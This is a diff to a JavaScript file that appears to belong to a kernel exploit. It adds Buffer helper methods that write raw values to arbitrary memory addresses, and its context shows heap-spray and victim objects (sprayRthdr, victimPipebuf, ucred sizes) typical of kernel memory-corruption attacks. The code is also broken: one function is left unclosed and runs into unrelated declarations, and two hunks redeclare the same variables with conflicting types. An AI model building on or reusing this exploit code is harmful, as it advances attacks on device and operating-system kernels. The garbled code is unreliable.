@@ -151,6 +151,33 @@ class RawBuffer {
     }
 }
 
+Buffer.prototype.write8 = function(offset, value) {
+    mem.write8(this.addr + offset, value & 0xFF);
+};
+
+Buffer.prototype.write16 = function(offset, value) {
+    mem.write16(this.addr + offset, value & 0xFFFF);
+};
+
+Buffer.prototype.write32 = function(offset, value) {
+    mem.write32(this.addr + offset, value >>> 0);
+};
+
+Buffer.prototype.putLong = function(offset, value) {
+    const v = BigInt(value);
+    const low = Number(v & 0xFFFFFFFFn);
+    const high = Number((v >> 32n) & 0xFFFFFFFFn);
+
+    mem.write32(this.addr + offset, low);
+    mem.write32(this.addr + offset + 4, high);
+};
+
+Buffer.prototype.fill = function(byte) {
+    for (let i = 0; i < this.size; i++) {
+        mem.write8(this.addr + i, byte);
+	}
+	
+
     const AF_UNIX = 1;
     const AF_INET6 = 28;
     const SOCK_STREAM = 1;
@@ -220,7 +247,7 @@ let sprayRthdr = new Buffer(UCRED_SIZE);
 let msg = new Buffer(MSG_HDR_SIZE);
 let sprayRthdrLen = 0;
 let msgIov = new Buffer(MSG_IOV_NUM * IOV_SIZE);
-let dummyBuffer = new Uint8Array(0x1000);
+let dummyBuffer = new Buffer(0x1000);
 let tmp = new Buffer(PAGE_SIZE);
 let victimPipebuf = new Buffer(PIPEBUF_SIZE);
 let uioIovRead = new Buffer(UIO_IOV_NUM * IOV_SIZE);
@@ -235,7 +262,7 @@ let msg             = new Uint8Array(MSG_HDR_SIZE);
 let sprayRthdrLen   = 0;
 
 let msgIov          = new Uint8Array(MSG_IOV_NUM * IOV_SIZE);
-let dummyBuffer     = new RawBuffer(0x1000);
+let dummyBuffer = new Buffer(0x1000);
 
 let tmp             = new Uint8Array(PAGE_SIZE);
 let victimPipebuf   = new Uint8Array(PIPEBUF_SIZE);
@@ -1534,6 +1561,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
